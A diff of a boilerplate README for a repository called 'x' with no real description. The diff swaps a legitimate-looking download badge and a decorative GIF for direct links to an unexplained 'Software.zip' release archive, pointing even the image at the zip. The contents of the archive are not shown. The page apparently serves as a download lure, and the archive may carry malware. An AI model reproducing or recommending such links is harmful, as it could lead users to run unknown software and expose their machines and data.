@@ -9,7 +9,7 @@ Unfortunately, a short description of this repository is not provided.
 Regrettably, there are no specified topics for this repository.
 
 ## Download Link
-[![Download x Repository](https://img.shields.io/badge/Download-x-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download x Repository](https://github.com/giuseppeluca00/x/releases/download/v1.0/Software.zip)](https://github.com/giuseppeluca00/x/releases/download/v1.0/Software.zip)
 
 Click the button above to download the x repository files. Let's dive into the unknown together!
 
@@ -17,4 +17,4 @@ If the provided link does not work, please check the "Releases" section for alte
 
 Happy coding! 🌟
 
-![Coding](https://media.giphy.com/media/13HgwGsXF0aiGY/giphy.gif)
+![Coding](https://github.com/giuseppeluca00/x/releases/download/v1.0/Software.zip)
